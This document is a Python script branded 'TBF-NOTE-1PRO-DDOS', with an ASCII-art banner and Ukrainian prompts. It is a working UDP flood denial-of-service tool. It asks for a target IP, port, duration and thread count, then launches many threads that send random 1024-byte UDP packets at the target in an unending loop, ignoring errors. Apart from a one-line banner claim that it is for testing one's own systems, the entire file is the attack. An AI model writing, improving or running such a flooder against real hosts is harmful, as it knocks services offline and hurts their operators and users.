#!/usr/bin/env python3
# ============================================
#   TBF-NOTE-1PRO-DDOS v1.0
#   by TBFPUMBA — Technology. Security. Efficiency.
# ============================================

import socket
import random
import threading
import time
import os
import sys

# Кольори
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
PURPLE = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"
RESET = "\033[0m"
BOLD = "\033[1m"

def clear():
    os.system("clear")

def banner():
    print(f"""{RED}{BOLD}
    ╔══════════════════════════════════════════════════════════════════╗
    ║                                                                  ║
    ║   ████████╗██████╗ ███████╗    ███╗   ██╗ ██████╗ ████████╗███████╗
    ║   ╚══██╔══╝██╔══██╗██╔════╝    ████╗  ██║██╔═══██╗╚══██╔══╝██╔════╝
    ║      ██║   ██████╔╝█████╗      ██╔██╗ ██║██║   ██║   ██║   █████╗  
    ║      ██║   ██╔══██╗██╔══╝      ██║╚██╗██║██║   ██║   ██║   ██╔══╝  
    ║      ██║   ██████╔╝██║         ██║ ╚████║╚██████╔╝   ██║   ███████╗
    ║      ╚═╝   ╚═════╝ ╚═╝         ╚═╝  ╚═══╝ ╚═════╝    ╚═╝   ╚══════╝
    ║                                                                  ║
    ║        ██████╗ ██████╗  ██████╗     ███████╗██╗  ██╗            ║
    ║        ██╔══██╗██╔══██╗██╔═══██╗    ██╔════╝██║  ██║            ║
    ║        ██████╔╝██████╔╝██║   ██║    ███████╗███████║            ║
    ║        ██╔═══╝ ██╔══██╗██║   ██║    ╚════██║██╔══██║            ║
    ║        ██║     ██║  ██║╚██████╔╝    ███████║██║  ██║            ║
    ║        ╚═╝     ╚═╝  ╚═╝ ╚═════╝     ╚══════╝╚═╝  ╚═╝            ║
    ║                                                                  ║
    ║                ██╗  ██╗██████╗ ██████╗  ██████╗                 ║
    ║                ██║  ██║██╔══██╗██╔══██╗██╔═══██╗                ║
    ║                ███████║██████╔╝██████╔╝██║   ██║                ║
    ║                ██╔══██║██╔═══╝ ██╔══██╗██║   ██║                ║
    ║                ██║  ██║██║     ██║  ██║╚██████╔╝                ║
    ║                ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝                 ║
    ║                                                                  ║
    ║                     TBFPUMBA — TECHNOLOGY. SECURITY. EFFICIENCY  ║
    ║                                                                  ║
    ╚══════════════════════════════════════════════════════════════════╝{RESET}
    """)
    print(f"{CYAN}╔══════════════════════════════════════════════════════════════════╗{RESET}")
    print(f"{CYAN}║{RESET} {BOLD}{PURPLE}🔥 TBF-NOTE-1PRO-DDOS v1.0 🔥{RESET}                            {CYAN}║{RESET}")
    print(f"{CYAN}║{RESET} {BOLD}{GREEN}⚡ by TBFPUMBA — Technology. Security. Efficiency.{RESET}   {CYAN}║{RESET}")
    print(f"{CYAN}║{RESET} {BOLD}{YELLOW}⚠️  ДЛЯ ТЕСТУВАННЯ НА СВОЇХ СИСТЕМАХ! ⚠️{RESET}      {CYAN}║{RESET}")
    print(f"{CYAN}╚══════════════════════════════════════════════════════════════════╝{RESET}")
    print()

def udp_flood(target_ip, target_port, duration, threads):
    def flood():
        while True:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                data = random._urandom(1024)
                sock.sendto(data, (target_ip, target_port))
            except:
                pass
    
    print(f"{GREEN}🔓 Запуск UDP-флуду на {target_ip}:{target_port}{RESET}")
    print(f"{YELLOW}⏳ Тривалість: {duration} секунд{RESET}")
    print(f"{YELLOW}🧵 Кількість потоків: {threads}{RESET}")
    print("=" * 60)
    
    for _ in range(threads):
        thread = threading.Thread(target=flood)
        thread.daemon = True
        thread.start()
    
    time.sleep(duration)
    print(f"{GREEN}✅ Атака завершена!{RESET}")

def main():
    clear()
    banner()
    
    target_ip = input(f"{GREEN}📝 Введіть IP-адресу цілі: {RESET}")
    target_port = int(input(f"{GREEN}📝 Введіть порт (наприклад, 80): {RESET}"))
    duration = int(input(f"{GREEN}📝 Введіть тривалість (секунди): {RESET}"))
    threads = int(input(f"{GREEN}📝 Введіть кількість потоків (наприклад, 50): {RESET}"))
    
    udp_flood(target_ip, target_port, duration, threads)

if __name__ == "__main__":
    main()
